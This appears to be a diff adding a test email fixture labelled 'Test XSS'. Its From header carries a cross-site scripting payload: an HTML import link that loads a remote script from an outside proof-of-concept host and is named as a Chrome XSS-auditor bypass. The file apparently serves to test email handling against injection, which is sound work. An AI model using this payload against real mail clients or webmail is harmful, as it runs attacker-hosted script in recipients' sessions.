@@ -1,0 +1,7 @@
+From: <"test<link rel=import href=//body.innerht.ml/pocs/chrome-xssauditor-bypass-html-import/xss.php>@attack.com">
+To: mlk@pkns.com, mmolland@brobeck.com, mtuohey@velaw.com, 
+Subject: Test XSS
+MIME-Version: 1.0
+Content-type: text/html
+
+This is a test mail for XSS.
